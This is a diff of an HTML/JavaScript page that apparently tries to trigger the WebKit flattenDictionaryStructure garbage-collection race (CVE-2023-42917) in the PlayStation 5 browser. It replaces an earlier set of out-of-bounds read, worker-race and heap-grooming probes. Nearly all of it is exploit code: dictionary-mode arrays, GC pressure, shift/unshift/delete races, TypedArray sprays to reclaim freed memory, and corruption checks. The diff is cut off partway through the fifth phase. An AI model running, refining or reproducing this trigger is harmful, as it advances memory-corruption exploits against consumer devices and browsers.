@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>PS5 v32 - CVE Hunt</title>
+<title>PS5 v33 - CVE-2023-42917</title>
 <style id="s">
 @font-face{font-family:prepad;src:url(np.woff);unicode-range:U+E123}
 @font-face{font-family:x;src:url(nx.woff);unicode-range:U+0042}
@@ -33,7 +33,7 @@ padding:10px 14px;overflow-y:auto;font-size:13px;line-height:1.55;
 </head>
 <body>
 <div id="hd">
-<span class="l">▶ v32 CVE-HUNT</span><span class="s">│</span>
+<span class="l">▶ v33 CVE-42917</span><span class="s">│</span>
 <span class="v" id="h1">FW:<b>?</b></span><span class="s">│</span>
 <span class="v" id="h2">STAGE:<b>INIT</b></span>
 </div>
@@ -43,554 +43,560 @@ padding:10px 14px;overflow-y:auto;font-size:13px;line-height:1.55;
 "use strict";
 
 // ============================================================
-//  PS5 v32 — CVE-2023-42916 & 42917 PoC Attempt
+//  PS5 v33 — CVE-2023-42917 Trigger Attempt
 //
-//  FROM WRITEUP:
-//  CVE-2023-42916: OOB Read in ArrayBuffer/TypedArray
-//  CVE-2023-42917: Race Condition (GC vs Execution)
+//  ROOT CAUSE (from writeup):
+//  flattenDictionaryStructure() can shrink the butterfly.
+//  Race condition: another reference keeps using the old,
+//  larger butterfly → UAF/OOB → memory corruption.
 //
-//  PLAN:
-//  1. Test OOB Read vectors on TypedArray/DataView
-//  2. Test Race Condition via Worker + ArrayBuffer transfer
-//  3. Test for-in structure modification OOB
-//  4. If any vector works → build addrof/fakeobj
+//  TRIGGER:
+//  1. Create arrays/objects in dictionary mode (large butterfly)
+//  2. Force GC (allocate a lot → GC starts scanning)
+//  3. During GC, call shift()/unshift()/delete to trigger
+//     flattenDictionaryStructure → butterfly resized
+//  4. GC follows stale pointer to old (freed) butterfly → UAF
+//  5. Spray TypedArrays to reclaim freed butterfly
+//  6. Check for corruption
+//
+//  KEY: This works on LLInt (no JIT needed)!
 // ============================================================
 
-const O = document.getElementById("out");
-const bar = document.getElementById("bar");
-function pg(p) { bar.style.width = p + "%" }
-function hu(id, v) { const e = document.getElementById(id); if (e) e.innerHTML = v }
-function P(m, c) { const s = document.createElement("span"); if (c) s.className = c;
-s.textContent = m + "\n"; O.appendChild(s); O.scrollTop = O.scrollHeight; }
-function Ok(m) { P("  ✅ " + m, "ok") } function Fl(m) { P("  ✘ " + m, "er") }
-function Hi(m) { P("  ► " + m, "hl") } function St(m) { P("  ★ " + m + " ★", "mg") }
-function Dm(m) { P("  " + m, "dm") } function Wr(m) { P("  ⚠ " + m, "wr") }
-function Hd(m) { P("▸ " + m, "hd") } function Sep() { P("─".repeat(42), "dm") }
+const O=document.getElementById("out");
+const bar=document.getElementById("bar");
+function pg(p){bar.style.width=p+"%"}
+function hu(id,v){const e=document.getElementById(id);if(e)e.innerHTML=v}
+function P(m,c){const s=document.createElement("span");if(c)s.className=c;
+s.textContent=m+"\n";O.appendChild(s);O.scrollTop=O.scrollHeight}
+function Ok(m){P("  ✅ "+m,"ok")}function Fl(m){P("  ✘ "+m,"er")}
+function Hi(m){P("  ► "+m,"hl")}function St(m){P("  ★ "+m+" ★","mg")}
+function Dm(m){P("  "+m,"dm")}function Wr(m){P("  ⚠ "+m,"wr")}
+function Hd(m){P("▸ "+m,"hd")}function Sep(){P("─".repeat(42),"dm")}
 
-window.onerror = function(m, s, l) { Fl("CRASH: " + m.substring(0, 60) + " @" + l); return true; };
+window.onerror=function(m,s,l){
+  Fl("CRASH: "+m.substring(0,80)+" @"+l);
+  St("CRASH = RACE CONDITION HIT!");
+  St("CVE-2023-42917 IS PRESENT ON PS5!");
+  return true;
+};
 
-var ua = navigator.userAgent || "";
-var m = ua.match(/PlayStation\s*5\/?\s*([0-9]+(?:\.[0-9]+)?)/i);
-hu("h1", "FW:<b>" + (m ? m[1] : "?") + "</b>");
+var ua=navigator.userAgent||"";
+var m=ua.match(/PlayStation\s*5\/?\s*([0-9]+(?:\.[0-9]+)?)/i);
+hu("h1","FW:<b>"+(m?m[1]:"?")+"</b>");
 
 P("════════════════════════════════════","hd");
-P("  v32 — CVE-2023-42916/42917 Hunt","hd");
+P("  v33 — CVE-2023-42917 Trigger","hd");
+P("  flattenDictionaryStructure Race","hd");
 P("════════════════════════════════════","hd");
 P("");
 
-// ============================================================
-//  PHASE 1: OOB Read Tests (CVE-2023-42916)
-// ============================================================
-hu("h2", "STAGE:<b>OOB READ</b>");
-pg(10); Sep(); Hd("PHASE 1: OOB Read Tests"); Sep();
-P("  Testing vectors for CVE-2023-42916...","dm");
-P("");
-
-// Vector 1: Direct index access on TypedArray
-P("  Vector 1: Direct TypedArray OOB access","");
-try {
-    let buf = new ArrayBuffer(0x10);
-    let view = new Uint8Array(buf);
-    let val = view[0x10]; // OOB
-    P("    victim[0x10] = " + val + " (expected: undefined)", val !== undefined ? "hl" : "dm");
-    
-    let val2 = view[0x20];
-    P("    victim[0x20] = " + val2, val2 !== undefined ? "hl" : "dm");
-    
-    let val3 = view[0x100];
-    P("    victim[0x100] = " + val3, val3 !== undefined ? "hl" : "dm");
-} catch(e) { Fl("    " + e.message); }
-
-// Vector 2: DataView with various offsets
-P("");
-P("  Vector 2: DataView OOB access","");
-try {
-    let buf = new ArrayBuffer(0x10);
-    let dv = new DataView(buf);
-    
-    let offsets = [0x10, 0x11, 0x14, 0x18, 0x100, 0x1000, -1, 0xFFFFFFFF];
-    for (let i = 0; i < offsets.length; i++) {
-        try {
-            let val = dv.getUint8(offsets[i]);
-            P("    DataView.getUint8(0x" + (offsets[i] >>> 0).toString(16) + ") = " + val, "hl");
-        } catch(e) {
-            P("    DataView.getUint8(0x" + (offsets[i] >>> 0).toString(16) + ") → " + e.message.substring(0, 30), "dm");
-        }
-    }
-} catch(e) { Fl("    " + e.message); }
-
-// Vector 3: TypedArray.prototype.subarray
-P("");
-P("  Vector 3: subarray with bad indices","");
-try {
-    let buf = new ArrayBuffer(0x10);
-    let view = new Uint8Array(buf);
-    
-    let sub1 = view.subarray(0, 0x100);
-    P("    subarray(0, 0x100).length = " + sub1.length, sub1.length > 0x10 ? "hl" : "dm");
-    
-    let sub2 = view.subarray(0x10, 0x20);
-    P("    subarray(0x10, 0x20).length = " + sub2.length, sub2.length > 0 ? "hl" : "dm");
-    
-    let sub3 = view.subarray(-0x100, 0x10);
-    P("    subarray(-0x100, 0x10).length = " + sub3.length, sub3.length > 0x10 ? "hl" : "dm");
-} catch(e) { Fl("    " + e.message); }
-
-// Vector 4: TypedArray.prototype.set with bad offset
-P("");
-P("  Vector 4: set with bad offset","");
-try {
-    let source = new Uint8Array(0x100);
-    let target = new Uint8Array(0x10);
-    target.set(source, 0x10);
-    P("    set(source, 0x10) → no error!", "hl");
-} catch(e) {
-    P("    set(source, 0x10) → " + e.message.substring(0, 30), "dm");
-}
-
-// Vector 5: copyWithin with bad arguments
-P("");
-P("  Vector 5: copyWithin with bad args","");
-try {
-    let arr = new Uint8Array(0x10);
-    arr.copyWithin(0, 0x10, 0x100);
-    P("    copyWithin(0, 0x10, 0x100) → no error!", "hl");
-} catch(e) {
-    P("    copyWithin → " + e.message.substring(0, 30), "dm");
-}
-
-// Vector 6: for...in with structure modification
-P("");
-P("  Vector 6: for...in structure modification","");
-try {
-    let obj = {};
-    for (let i = 0; i < 100; i++) obj['p' + i] = i;
-    
-    let leaked = [];
-    let count = 0;
-    for (let key in obj) {
-        count++;
-        if (count === 50) {
-            for (let i = 100; i < 200; i++) obj['new' + i] = i;
-            delete obj['p0'];
-            delete obj['p1'];
-        }
-        leaked.push(key);
-    }
-    P("    Enumerated " + count + " keys (expected ~100)", count > 100 ? "hl" : "dm");
-    P("    Leaked array length: " + leaked.length, leaked.length > 100 ? "hl" : "dm");
-} catch(e) { Fl("    " + e.message); }
-
-// Vector 7: Proxy-based TOCTOU
-P("");
-P("  Vector 7: Proxy TOCTOU","");
-try {
-    let arr = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8];
-    let accessCount = 0;
-    let handler = {
-        get(target, prop) {
-            if (prop === 'length') {
-                accessCount++;
-                if (accessCount === 1) return 8;
-                target.length = 0;
-                return 8;
-            }
-            return target[prop];
-        }
-    };
-    let proxy = new Proxy(arr, handler);
-    let result = Array.from(proxy);
-    P("    Array.from(proxy).length = " + result.length + " (expected 8)", result.length > 0 ? "dm" : "dm");
-} catch(e) { Fl("    " + e.message); }
-
-// Vector 8: Species pattern
-P("");
-P("  Vector 8: Species pattern","");
-try {
-    class BadArray extends Uint8Array {
-        static get [Symbol.species]() {
-            return Array;
-        }
-        constructor(len) {
-            super(len);
-        }
-    }
-    let arr = new BadArray(0x10);
-    let result = arr.map(x => x + 1);
-    P("    map result type: " + result.constructor.name, result.constructor.name !== "Uint8Array" ? "hl" : "dm");
-    P("    map result length: " + result.length, "dm");
-} catch(e) {
-    P("    Species: " + e.message.substring(0, 40), "dm");
-}
-
-// Vector 9: Detached ArrayBuffer access
-P("");
-P("  Vector 9: Detached ArrayBuffer access","");
-try {
-    let buf = new ArrayBuffer(0x100);
-    let view = new Uint8Array(buf);
-    for (let i = 0; i < 0x100; i++) view[i] = i;
-    
-    // Create a worker to receive the transfer
-    let worker = new Worker(URL.createObjectURL(new Blob([
-        "onmessage=function(e){postMessage('got it')};"
-    ])));
-    
-    // Transfer the buffer (detaches it)
-    worker.postMessage(buf, [buf]);
-    
-    // Immediately try to access the view
-    let val = view[0];
-    P("    After transfer: view[0] = " + val + " (was 0)", val !== 0 ? "hl" : "dm");
-    P("    buf.byteLength = " + buf.byteLength + " (expected 0 if detached)", buf.byteLength === 0 ? "dm" : "hl");
-    
-    worker.terminate();
-} catch(e) { Fl("    " + e.message); }
-
-// Vector 10: Reflect.get on TypedArray
-P("");
-P("  Vector 10: Reflect.get on TypedArray","");
-try {
-    let buf = new ArrayBuffer(0x10);
-    let view = new Uint8Array(buf);
-    
-    let val = Reflect.get(view, 0x10);
-    P("    Reflect.get(view, 0x10) = " + val, val !== undefined ? "hl" : "dm");
-    
-    let val2 = Reflect.get(view, 0x100);
-    P("    Reflect.get(view, 0x100) = " + val2, val2 !== undefined ? "hl" : "dm");
-} catch(e) { Fl("    " + e.message); }
+// Watchdog: yield to event loop
+function watchdog(delay){return new Promise(r=>setTimeout(r,delay))}
 
 // ============================================================
-//  PHASE 2: Race Condition Tests (CVE-2023-42917)
+//  PHASE 1: Array shift() + GC Race
+//  shift() on dictionary-mode array triggers
+//  flattenDictionaryStructure → butterfly resize
 // ============================================================
-setTimeout(function() {
-hu("h2", "STAGE:<b>RACE</b>");
-pg(40); Sep(); Hd("PHASE 2: Race Condition Tests"); Sep();
-P("  Testing vectors for CVE-2023-42917...","dm");
-P("");
+async function phase1_arrayShiftRace(){
+  hu("h2","STAGE:<b>SHIFT RACE</b>");
+  pg(10);Sep();Hd("PHASE 1: Array shift() + GC Race");Sep();
+  P("  Creating dictionary-mode arrays...","dm");
 
-// Test 1: ArrayBuffer transfer race
-P("  Test 1: ArrayBuffer transfer race","");
-let race1Corrupted = false;
-let race1Attempts = 0;
+  // Create arrays in dictionary mode
+  // Dictionary mode: add elements at high indices, then delete some
+  var arrays=[];
+  var refs=[]; // Save reference values to detect corruption
 
-function tryTransferRace() {
-    for (let attempt = 0; attempt < 100; attempt++) {
-        try {
-            let buf = new ArrayBuffer(0x100);
-            let view = new Float64Array(buf);
-            for (let i = 0; i < 0x20; i++) view[i] = 1.1;
-            
-            let worker = new Worker(URL.createObjectURL(new Blob([
-                "onmessage=function(e){postMessage('ok')};"
-            ])));
-            
-            // Transfer buffer
-            worker.postMessage(buf, [buf]);
-            
-            // Immediately access view
-            let val = view[0];
-            
-            if (val !== 1.1 && val !== undefined && !isNaN(val)) {
-                race1Corrupted = true;
-                race1Attempts = attempt;
-                St("CORRUPTION at attempt " + attempt + ": val=" + val);
-                worker.terminate();
-                return;
-            }
-            
-            worker.terminate();
-            race1Attempts = attempt;
-        } catch(e) {}
+  for(var i=0;i<200;i++){
+    var arr=[];
+    // Fill with doubles (stored in butterfly)
+    for(var j=0;j<100;j++) arr[j]=j*1.1+0.001*i;
+    // Force dictionary mode: add sparse element at high index
+    arr[5000]=9999.999;
+    // Delete some elements to make it more dictionary-like
+    delete arr[50];
+    delete arr[51];
+    arrays.push(arr);
+    // Save reference to element 10 (should be 10*1.1 = 11.0)
+    refs.push(arr[10]);
+  }
+  Ok("200 dictionary-mode arrays created");
+  P("");
+
+  var corrupted=0;
+  var crashed=false;
+
+  // Race loop: GC pressure + shift()
+  for(var round=0;round<50;round++){
+    // Step 1: Force GC by allocating a lot of temporary buffers
+    // This makes the GC start scanning our arrays' butterflies
+    for(var j=0;j<500;j++) new ArrayBuffer(1024);
+
+    // Step 2: Immediately call shift() on all arrays
+    // This triggers flattenDictionaryStructure → butterfly resize
+    // The GC might be scanning the old butterfly → UAF!
+    for(var i=0;i<arrays.length;i++){
+      try{
+        arrays[i].shift();
+      }catch(e){
+        crashed=true;
+        St("EXCEPTION during shift: "+e.message);
+        break;
+      }
     }
-    P("    Tested " + race1Attempts + " attempts", race1Corrupted ? "hl" : "dm");
-    if (!race1Corrupted) P("    No corruption detected","dm");
-    test2();
+
+    // Step 3: Check for corruption
+    for(var i=0;i<arrays.length;i++){
+      try{
+        // After shift, element 10 should now be at index 9
+        // Value should be 11*1.1 = 12.1 (the old element 11)
+        var expected=11*1.1+0.001*i;
+        var actual=arrays[i][9];
+        if(actual!==expected && !isNaN(actual) && actual!==undefined){
+          corrupted++;
+          if(corrupted<=5){
+            Hi("CORRUPTION: arr["+i+"][9] = "+actual+" (expected "+expected+")");
+          }
+        }
+      }catch(e){
+        corrupted++;
+        if(corrupted<=5) Hi("ACCESS ERROR: arr["+i+"][9]: "+e.message);
+      }
+    }
+
+    if(crashed) break;
+
+    // Yield to event loop every 5 rounds
+    if(round%5===0){
+      P("  Round "+round+"/50: corrupted="+corrupted,"dm");
+      await watchdog(20);
+    }
+  }
+
+  P("");
+  P("  Rounds: 50, Corrupted: "+corrupted,corrupted>0?"hl":"dm");
+  if(corrupted>0){
+    St("ARRAY DATA CORRUPTED = RACE HIT!");
+  }
+  return corrupted;
 }
 
-tryTransferRace();
+// ============================================================
+//  PHASE 2: Object flattenDictionaryStructure + GC Race
+//  Delete properties from dictionary-mode objects → triggers flatten
+// ============================================================
+async function phase2_objectFlattenRace(){
+  hu("h2","STAGE:<b>FLATTEN RACE</b>");
+  pg(30);Sep();Hd("PHASE 2: Object Flatten + GC Race");Sep();
+  P("  Creating dictionary-mode objects...","dm");
 
-// Test 2: GC race with Worker
-function test2() {
-P("");
-P("  Test 2: GC race with Worker","");
-let race2Corrupted = false;
+  var objects=[];
+  var refs=[];
 
-let workerCode = `
-    let i = 0;
-    let objs = [];
-    function loop() {
-        for (let j = 0; j < 1000; j++) {
-            objs.push(new ArrayBuffer(64));
+  for(var i=0;i<200;i++){
+    var obj={};
+    // Add many properties → dictionary mode
+    for(var j=0;j<100;j++) obj['prop_'+j]=j*2.2+0.001*i;
+    // Add some random properties to make it more dictionary-like
+    obj['extra_1']=1.1;
+    obj['extra_2']=2.2;
+    delete obj['prop_50'];
+    objects.push(obj);
+    // Save reference value
+    refs.push(obj['prop_10']);
+  }
+  Ok("200 dictionary-mode objects created");
+  P("");
+
+  var corrupted=0;
+  var crashed=false;
+
+  for(var round=0;round<50;round++){
+    // Force GC
+    for(var j=0;j<500;j++) new ArrayBuffer(1024);
+
+    // Delete properties from all objects → triggers flattenDictionaryStructure
+    for(var i=0;i<objects.length;i++){
+      try{
+        // Delete several properties → triggers structure transition
+        delete objects[i]['prop_'+(round%100)];
+        delete objects[i]['prop_'+((round+1)%100)];
+        // Access remaining properties → might trigger flatten
+        var val=objects[i]['prop_10'];
+      }catch(e){
+        crashed=true;
+        St("EXCEPTION during flatten: "+e.message);
+        break;
+      }
+    }
+
+    // Check for corruption
+    for(var i=0;i<objects.length;i++){
+      try{
+        var expected=10*2.2+0.001*i;
+        var actual=objects[i]['prop_10'];
+        if(actual!==expected && !isNaN(actual) && actual!==undefined){
+          corrupted++;
+          if(corrupted<=5){
+            Hi("CORRUPTION: obj["+i+"].prop_10 = "+actual+" (expected "+expected+")");
+          }
         }
-        if (objs.length > 10000) objs = [];
-        i++;
-        postMessage(i);
+      }catch(e){
+        corrupted++;
+        if(corrupted<=5) Hi("ACCESS ERROR: "+e.message);
+      }
+    }
+
+    if(crashed) break;
+
+    if(round%5===0){
+      P("  Round "+round+"/50: corrupted="+corrupted,"dm");
+      await watchdog(20);
+    }
+  }
+
+  P("");
+  P("  Rounds: 50, Corrupted: "+corrupted,corrupted>0?"hl":"dm");
+  if(corrupted>0){
+    St("OBJECT DATA CORRUPTED = RACE HIT!");
+  }
+  return corrupted;
+}
+
+// ============================================================
+//  PHASE 3: TypedArray Spray + UAF Detection
+//  If butterfly was freed, spray to reclaim it
+// ============================================================
+async function phase3_typedArraySpray(){
+  hu("h2","STAGE:<b>SPRAY+UAF</b>");
+  pg(50);Sep();Hd("PHASE 3: TypedArray Spray + UAF");Sep();
+  P("  Spraying TypedArrays to reclaim freed butterflies...","dm");
+  P("");
+
+  var spray=[];
+  var MARKER=0xCAFEBABE;
+  var MARKER2=0xDEADBEEF;
+
+  // Spray 64-byte TypedArrays (common butterfly size)
+  for(var i=0;i<2000;i++){
+    var buf=new ArrayBuffer(64);
+    var view=new DataView(buf);
+    view.setUint32(0,MARKER,true);
+    view.setUint32(4,i,true);
+    view.setUint32(8,MARKER2,true);
+    spray.push({buf:buf,view:view,index:i});
+  }
+  Ok("2000 TypedArrays sprayed (64 bytes each)");
+  P("");
+
+  // Now trigger the race with spray in place
+  var arrays=[];
+  for(var i=0;i<100;i++){
+    var arr=[];
+    for(var j=0;j<50;j++) arr[j]=j*3.3;
+    arr[5000]=8888.888;
+    delete arr[25];
+    arrays.push(arr);
+  }
+
+  var corrupted=0;
+
+  for(var round=0;round<30;round++){
+    // Force GC
+    for(var j=0;j<500;j++) new ArrayBuffer(1024);
+
+    // Shift all arrays (trigger flattenDictionaryStructure)
+    for(var i=0;i<arrays.length;i++){
+      try{ arrays[i].shift(); }catch(e){}
+    }
+
+    // Check if spray arrays are corrupted
+    // (if old butterfly was freed and reclaimed by spray,
+    //  GC might have written to our spray buffer)
+    for(var i=0;i<spray.length;i++){
+      try{
+        var m1=spray[i].view.getUint32(0,true);
+        var m2=spray[i].view.getUint32(8,true);
+        if(m1!==MARKER || m2!==MARKER2){
+          corrupted++;
+          if(corrupted<=10){
+            Hi("SPRAY CORRUPTION at ["+i+"]: m1=0x"+m1.toString(16)+" m2=0x"+m2.toString(16));
+          }
+        }
+      }catch(e){
+        corrupted++;
+        if(corrupted<=10) Hi("SPRAY ACCESS ERR at ["+i+"]");
+      }
+    }
+
+    if(round%5===0){
+      P("  Round "+round+"/30: spray corrupted="+corrupted,"dm");
+      await watchdog(20);
+    }
+  }
+
+  P("");
+  P("  Spray corrupted: "+corrupted+"/"+spray.length,corrupted>0?"hl":"dm");
+  if(corrupted>0){
+    St("SPRAY CORRUPTED = BUTTERFLY UAF CONFIRMED!");
+  }
+
+  // Free spray
+  spray.length=0;
+  return corrupted;
+}
+
+// ============================================================
+//  PHASE 4: Worker-based GC Pressure Race
+//  Worker creates concurrent GC pressure while main thread
+//  triggers flattenDictionaryStructure
+// ============================================================
+async function phase4_workerRace(){
+  hu("h2","STAGE:<b>WORKER RACE</b>");
+  pg(70);Sep();Hd("PHASE 4: Worker-based GC Race");Sep();
+
+  var workerCode=`
+    var objs=[];
+    var running=true;
+    function loop(){
+      if(!running) return;
+      // Allocate objects to create GC pressure
+      for(var i=0;i<100;i++){
+        objs.push(new ArrayBuffer(256));
+      }
+      if(objs.length>5000) objs=[];
+      postMessage(objs.length);
     }
     setInterval(loop, 0);
-`;
+  `;
 
-let worker2;
-try {
-    worker2 = new Worker(URL.createObjectURL(new Blob([workerCode])));
-} catch(e) {
-    Fl("    Worker creation failed: " + e.message);
-    test3();
-    return;
-}
+  var worker;
+  try{
+    worker=new Worker(URL.createObjectURL(new Blob([workerCode])));
+  }catch(e){
+    Fl("Worker creation failed: "+e.message);
+    return 0;
+  }
 
-let race2Count = 0;
-let race2Target = 50;
+  P("  Worker started, creating GC pressure...","dm");
+  P("");
 
-worker2.onmessage = function(e) {
-    race2Count++;
-    
-    // Try to access objects while GC might be running
-    try {
-        let target = new Float64Array(8);
-        target[0] = 1.1;
-        target[1] = 2.2;
-        target[2] = 3.3;
-        
-        if (target[0] !== 1.1 || target[1] !== 2.2 || target[2] !== 3.3) {
-            race2Corrupted = true;
-            St("GC RACE CORRUPTION at iter " + race2Count);
-            P("    target[0]=" + target[0] + " [1]=" + target[1] + " [2]=" + target[2], "hl");
-        }
-    } catch(e) {
-        race2Corrupted = true;
-        St("GC RACE EXCEPTION at iter " + race2Count + ": " + e.message);
+  // Create arrays for the race
+  var arrays=[];
+  for(var i=0;i<100;i++){
+    var arr=[];
+    for(var j=0;j<100;j++) arr[j]=j*1.1+0.001*i;
+    arr[5000]=7777.777;
+    delete arr[50];
+    arrays.push(arr);
+  }
+
+  var refs=[];
+  for(var i=0;i<arrays.length;i++) refs.push(arrays[i][10]);
+
+  var corrupted=0;
+  var msgCount=0;
+
+  worker.onmessage=function(e){
+    msgCount++;
+  };
+
+  // Race: worker creates GC pressure, main thread shifts
+  for(var round=0;round<30;round++){
+    // Shift all arrays (trigger flatten)
+    for(var i=0;i<arrays.length;i++){
+      try{
+        arrays[i].shift();
+        arrays[i].shift();
+        arrays[i].unshift(0.123);
+      }catch(e){
+        St("EXCEPTION: "+e.message);
+        break;
+      }
     }
-    
-    if (race2Count >= race2Target) {
-        worker2.terminate();
-        P("    Tested " + race2Count + " iterations", race2Corrupted ? "hl" : "dm");
-        if (!race2Corrupted) P("    No corruption detected","dm");
-        test3();
-    }
-};
-}
 
-// Test 3: Structure transition race
-function test3() {
-P("");
-P("  Test 3: Structure transition race","");
-let race3Corrupted = false;
+    // Also allocate on main thread
+    for(var j=0;j<200;j++) new ArrayBuffer(512);
 
-let workerCode3 = `
-    let obj = {};
-    let i = 0;
-    function loop() {
-        obj['prop' + i] = i;
-        i++;
-        if (i > 1000) {
-            obj = {};
-            i = 0;
+    // Check for corruption
+    for(var i=0;i<arrays.length;i++){
+      try{
+        // After 2 shifts + 1 unshift, element at index 9 should be original element 10
+        var expected=refs[i]; // original arr[10]
+        var actual=arrays[i][9];
+        if(actual!==expected && !isNaN(actual) && actual!==undefined){
+          corrupted++;
+          if(corrupted<=5){
+            Hi("WORKER RACE CORRUPTION: arr["+i+"][9]="+actual+" (expected "+expected+")");
+          }
         }
-        postMessage(i);
+      }catch(e){
+        corrupted++;
+        if(corrupted<=5) Hi("ACCESS ERR: "+e.message);
+      }
     }
-    setInterval(loop, 0);
-`;
 
-let worker3;
-try {
-    worker3 = new Worker(URL.createObjectURL(new Blob([workerCode3])));
-} catch(e) {
-    Fl("    Worker creation failed: " + e.message);
-    test4();
-    return;
-}
-
-let race3Count = 0;
-let race3Target = 50;
-
-worker3.onmessage = function(e) {
-    race3Count++;
-    
-    try {
-        let obj = {};
-        for (let i = 0; i < 100; i++) obj['p' + i] = i;
-        
-        let keys = Object.keys(obj);
-        if (keys.length !== 100) {
-            race3Corrupted = true;
-            St("STRUCTURE RACE: keys.length=" + keys.length + " (expected 100)");
-        }
-        
-        delete obj['p50'];
-        delete obj['p51'];
-        let keys2 = Object.keys(obj);
-        if (keys2.length !== 98) {
-            race3Corrupted = true;
-            St("STRUCTURE RACE: after delete keys.length=" + keys2.length);
-        }
-    } catch(e) {
-        race3Corrupted = true;
-        St("STRUCTURE RACE EXCEPTION: " + e.message);
+    if(round%5===0){
+      P("  Round "+round+"/30: corrupted="+corrupted+" worker_msgs="+msgCount,"dm");
+      await watchdog(50); // Longer delay for worker
     }
-    
-    if (race3Count >= race3Target) {
-        worker3.terminate();
-        P("    Tested " + race3Count + " iterations", race3Corrupted ? "hl" : "dm");
-        if (!race3Corrupted) P("    No corruption detected","dm");
-        test4();
-    }
-};
+  }
+
+  worker.terminate();
+  P("");
+  P("  Worker race corrupted: "+corrupted,corrupted>0?"hl":"dm");
+  if(corrupted>0){
+    St("WORKER RACE CORRUPTION CONFIRMED!");
+  }
+  return corrupted;
 }
-
-// Test 4: WeakRef + FinalizationRegistry race
-function test4() {
-P("");
-P("  Test 4: WeakRef + FinalizationRegistry race","");
-
-if (typeof WeakRef === "undefined") {
-    P("    WeakRef not available","dm");
-    test5();
-    return;
-}
-
-let race4Corrupted = false;
-let registry;
-
-try {
-    registry = new FinalizationRegistry(function(value) {
-        // Callback during GC
-    });
-} catch(e) {
-    P("    FinalizationRegistry not available","dm");
-    test5();
-    return;
-}
-
-let weakRefs = [];
-let target = 100;
-
-for (let i = 0; i < target; i++) {
-    let obj = { data: i, buffer: new ArrayBuffer(64) };
-    let ref = new WeakRef(obj);
-    registry.register(obj, i);
-    weakRefs.push(ref);
-    obj = null;
-}
-
-// Force GC
-for (let i = 0; i < 4; i++) {
-    let tmp = [];
-    for (let j = 0; j < 256; j++) tmp.push(new ArrayBuffer(8192));
-}
-
-let alive = 0;
-let dead = 0;
-let corrupted = 0;
-
-for (let i = 0; i < weakRefs.length; i++) {
-    let obj = weakRefs[i].deref();
-    if (obj) {
-        alive++;
-        if (obj.data !== i) {
-            corrupted++;
-            if (corrupted <= 5) {
-                St("WeakRef CORRUPTION: expected data=" + i + " got=" + obj.data);
-            }
-        }
-    } else {
-        dead++;
-    }
-}
-
-P("    Alive: " + alive + " / Dead: " + dead + " / Corrupted: " + corrupted, corrupted > 0 ? "hl" : "dm");
-
-test5();
-}
-
-// Test 5: Heap grooming + OOB read
-function test5() {
-P("");
-hu("h2", "STAGE:<b>HEAP GROOM</b>");
-pg(70); Sep(); Hd("Test 5: Heap Grooming + OOB Read"); Sep();
-P("  Allocating objects and checking neighbors...","dm");
-P("");
-
-// Allocate many small ArrayBuffers
-let spray = [];
-for (let i = 0; i < 0x1000; i++) {
-    spray.push(new ArrayBuffer(0x100));
-}
-
-// Fill with marker pattern
-for (let i = 0; i < spray.length; i++) {
-    let view = new DataView(spray[i]);
-    view.setUint32(0, 0xDEAD0000 | i, true);
-    view.setUint32(4, 0xCAFEBABE, true);
-}
-
-// Free every other one to create gaps
-let freed = [];
-for (let i = 1; i < spray.length; i += 2) {
-    freed.push(spray[i]);
-    spray[i] = null;
-}
-
-// Force GC
-for (let i = 0; i < 4; i++) {
-    let tmp = [];
-    for (let j = 0; j < 256; j++) tmp.push(new ArrayBuffer(8192));
-}
-
-// Now allocate victim buffers
-let victims = [];
-for (let i = 0; i < 100; i++) {
-    victims.push(new ArrayBuffer(0x100));
-}
-
-// Check if victim buffers contain data from freed neighbors
-let leaked = 0;
-for (let i = 0; i < victims.length; i++) {
-    let view = new DataView(victims[i]);
-    let marker = view.getUint32(0, true);
-    let marker2 = view.getUint32(4, true);
-    
-    if (marker2 === 0xCAFEBABE) {
-        leaked++;
-        if (leaked <= 5) {
-            Hi("LEAKED DATA in victim[" + i + "]: 0x" + marker.toString(16) + " 0x" + marker2.toString(16));
-        }
-    }
-    
-    // Also try OOB read
-    try {
-        let oobVal = view.getUint32(0x100, true); // 1 byte past end
-        if (oobVal !== 0 && !isNaN(oobVal)) {
-            Hi("OOB READ at victim[" + i + "]+0x100: 0x" + oobVal.toString(16));
-            leaked++;
-        }
-    } catch(e) {}
-}
-
-P("  Leaked markers: " + leaked, leaked > 0 ? "hl" : "dm");
-P("  Victims allocated: " + victims.length, "dm");
 
 // ============================================================
-//  SUMMARY
+//  PHASE 5: Intensive shift/unshift + delete Race
+//  Combine all operations in a tight loop
 // ============================================================
-setTimeout(function() {
-pg(100); Sep(); Hd("FINAL SUMMARY"); Sep();
-P("");
-P("  OOB Read Tests:     Completed");
-P("  Race Condition Tests: Completed");
-P("  Heap Grooming:      Completed");
-P("");
-P("  Key findings:","hl");
-P("  1. Any OOB read that returned non-undefined = VULNERABLE","dm");
-P("  2. Any race corruption = VULNERABLE","dm");
-P("  3. Any leaked marker = heap layout predictable","dm");
-P("");
-hu("h2", "STAGE:<b>DONE</b>");
-}, 1000);
+async function phase5_intensiveRace(){
+  hu("h2","STAGE:<b>INTENSIVE</b>");
+  pg(85);Sep();Hd("PHASE 5: Intensive Combined Race");Sep();
+  P("  Running intensive combined race...","dm");
+  P("");
+
+  var corrupted=0;
+
+  for(var round=0;round<20;round++){
+    // Create fresh arrays each round
+    var arrays=[];
+    for(var i=0;i<50;i++){
+      var arr=[];
+      for(var j=0;j<200;j++) arr[j]=j*1.1+0.001*i;
+      // Force dictionary mode
+      arr[10000]=5555.555;
+      delete arr[100];
+      delete arr[101];
+      arrays.push(arr);
+    }
+
+    // Save references
+    var refs=[];
+    for(var i=0;i<arrays.length;i++) refs.push(arrays[i][50]);
+
+    // Massive GC pressure
+    for(var j=0;j<2000;j++) new ArrayBuffer(512);
+
+    // Rapid shift/unshift/delete cycle
+    for(var iter=0;iter<10;iter++){
+      for(var i=0;i<arrays.length;i++){
+        try{
+          arrays[i].shift();
+          arrays[i].shift();
+          arrays[i].unshift(0.001);
+          arrays[i].unshift(0.002);
+          // Delete some properties
+          delete arrays[i][iter*5];
+        }catch(e){
+          St("EXCEPTION at round="+round+" iter="+iter+" i="+i+": "+e.message);
+          break;
+        }
+      }
+    }
+
+    // More GC pressure
+    for(var j=0;j<2000;j++) new ArrayBuffer(512);
+
+    // Check for corruption
+    for(var i=0;i<arrays.length;i++){
+      try{
+        // After 10 iterations of 2 shift + 2 unshift:
+        // net effect: 0 shift (2 shift + 2 unshift = net 0)
+        // So element 50 should still be the same
+        var expected=refs[i];
